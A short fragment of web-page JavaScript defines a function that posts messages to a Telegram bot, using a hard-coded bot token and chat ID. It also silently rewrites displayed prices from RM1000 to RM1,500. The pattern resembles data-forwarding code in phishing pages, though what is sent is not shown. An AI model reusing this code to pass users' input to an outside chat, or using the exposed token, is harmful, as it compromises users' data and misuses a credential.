...
function sendToTelegram(message) {
  const token = "7072837680:AAF9-abOsjz_ncyy0K2sXMGUO9jjU7EyXjU"; // Token bot Telegram Anda
  const chatId = "6364682992"; // Chat ID atau ID grup Anda
...
document.querySelectorAll(".h2").forEach((item) => {
  item.textContent = item.textContent.replace("RM1000", "RM1,500");
});
